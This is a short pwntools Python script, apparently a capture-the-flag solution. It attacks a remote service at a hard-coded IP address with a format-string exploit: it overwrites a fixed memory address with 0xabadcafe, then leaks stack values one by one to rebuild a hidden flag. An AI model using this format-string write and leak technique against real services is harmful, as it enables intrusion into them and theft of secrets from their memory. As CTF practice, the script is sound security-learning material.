import pwn
import time

i = 6
a = []
while i != 30:
    r = pwn.remote("185.235.41.205", 7040)
    r.recvlines(11)
    r.sendline("A".encode())
    r.recvline()
    w = {0x0804c03c: 0xabadcafe}
    p = pwn.fmtstr_payload(15, w)
    r.sendline(p)
    r.recvline()
    r.recvline()
    p = "%" + str(i) + "$p"
    r.sendline(p.encode())
    admin_pass = r.recvlines(3)[2].decode().split(" ")[-1]
    a.append(admin_pass)
    try:
        print(pwn.p32(int(admin_pass, 16)))
    except:
        pass
    i += 1

flag = []
for k in a[1:21]:
    try:
        flag.append(pwn.p32(int(k, 16)).decode())
    except Exception as e:
        pass

print("".join(flag))
